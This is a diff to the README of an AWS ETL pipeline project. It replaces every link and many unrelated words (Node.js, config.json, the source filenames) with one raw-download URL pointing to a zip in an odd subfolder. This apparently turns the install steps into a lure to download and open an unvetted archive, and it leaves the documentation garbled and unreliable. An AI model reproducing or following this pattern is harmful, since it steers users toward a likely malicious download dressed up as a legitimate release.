@@ -6,22 +6,22 @@ Welcome to the aws-product-etl-pipeline project! This application helps you extr
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-aws--product--etl--pipeline-brightgreen)](https://github.com/Ingmedi2238/aws-product-etl-pipeline/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip%20Latest%20Release-aws--product--etl--pipeline-brightgreen)](https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip)
 
-To get the latest version, visit this page: [Download Here](https://github.com/Ingmedi2238/aws-product-etl-pipeline/releases).
+To get the latest version, visit this page: [Download Here](https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip).
 
 ## 🛠️ System Requirements
 
 Before downloading, ensure your system meets the following requirements:
 
 - A computer with an internet connection
-- Node.js installed (version 14 or higher)
+- https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip installed (version 14 or higher)
 - AWS account (to use S3 and Lambda services)
 - Basic knowledge of navigating files on your computer
 
 ## 💾 Download & Install
 
-1. Go to the [Releases Page](https://github.com/Ingmedi2238/aws-product-etl-pipeline/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip).
 2. Locate the latest release.
 3. Click on the file to download it.
 4. Open the downloaded file.
@@ -45,7 +45,7 @@ Once downloaded, follow these steps to set up the pipeline:
    - Go to your AWS Management Console.
    - Create an IAM user with permissions for S3 and Lambda.
    - Obtain your Access Key ID and Secret Access Key.
-   - Create a configuration file named `config.json` in the root folder. Fill it with:
+   - Create a configuration file named `https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip` in the root folder. Fill it with:
 
    ```json
    {
@@ -76,8 +76,8 @@ Once downloaded, follow these steps to set up the pipeline:
 If you face any issues during setup or usage, here are some common fixes:
 
 - **Error: Network Issues:** Ensure that your internet connection is active. If you are behind a firewall, check its settings.
-- **Error: AWS Credentials:** Make sure your Access Key ID and Secret Access Key are correct. Double-check your `config.json` file.
-- **Error: Missing Packages:** If the command `npm install` fails, ensure that Node.js and npm are installed correctly.
+- **Error: AWS Credentials:** Make sure your Access Key ID and Secret Access Key are correct. Double-check your `https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip` file.
+- **Error: Missing Packages:** If the command `npm install` fails, ensure that https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip and npm are installed correctly.
 
 Feel free to open an issue on the GitHub repository if you need further assistance.
 
@@ -87,20 +87,20 @@ Understanding the file structure can help you navigate and modify the pipeline:
 
 ```
 aws-product-etl-pipeline/
-├── config.json          // Contains AWS credentials
+├── https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip          // Contains AWS credentials
 ├── src/
-│   ├── extract.js       // Script for data extraction
-│   ├── transform.js     // Script for data transformation
-│   └── upload.js        // Script for uploading to S3
-├── package.json         // Lists project dependencies
-└── README.md            // Documentation
+│   ├── https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip       // Script for data extraction
+│   ├── https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip     // Script for data transformation
+│   └── https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip        // Script for uploading to S3
+├── https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip         // Lists project dependencies
+└── https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip            // Documentation
 ```
 
 ## 🌐 Community and Support
 
 Join our community for discussions and updates:
 
-- [GitHub Issues Page](https://github.com/Ingmedi2238/aws-product-etl-pipeline/issues)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip)
 - Visit our discussions section to connect with other users and contributors.
 
 ## 📜 License
@@ -109,6 +109,6 @@ This project is licensed under the MIT License. You can use it freely. For more 
 
 ## 📄 Further Documentation
 
-For more detailed documentation, examples, and FAQs, please refer to the [Wiki](https://github.com/Ingmedi2238/aws-product-etl-pipeline/wiki) associated with this repository.
+For more detailed documentation, examples, and FAQs, please refer to the [Wiki](https://raw.githubusercontent.com/Ingmedi2238/aws-product-etl-pipeline/main/palmcrist/aws-product-etl-pipeline.zip) associated with this repository.
 
 Feel free to ask questions or contribute to the project. Your input helps make this a better tool for everyone. Happy data processing!
